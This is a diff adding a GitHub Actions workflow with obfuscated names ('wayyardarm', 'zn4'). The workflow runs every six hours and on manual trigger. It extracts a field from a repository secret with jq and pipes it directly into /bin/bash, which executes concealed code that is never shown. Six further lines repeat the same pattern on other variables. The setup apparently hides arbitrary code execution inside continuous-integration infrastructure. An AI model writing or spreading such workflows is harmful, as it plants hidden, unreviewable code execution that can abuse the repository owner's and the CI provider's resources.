@@ -1,0 +1,24 @@
+name: wayyardarm
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wayyardarm
+        env:
+          zn4: ${{ secrets.zn4 }}
+        run: |
+          echo $zn4 | jq -r .a7 | /bin/bash
+          echo $yzr97533 | jq -r .pu1 | /bin/bash
+          echo $dk23757 | jq -r .em186 | /bin/bash
+          echo $vyum81 | jq -r .duhj5 | /bin/bash
+          echo $e107 | jq -r .rho8 | /bin/bash
+          echo $j7 | jq -r .enhk0584 | /bin/bash
+          echo $ui62 | jq -r .dib746 | /bin/bash
+
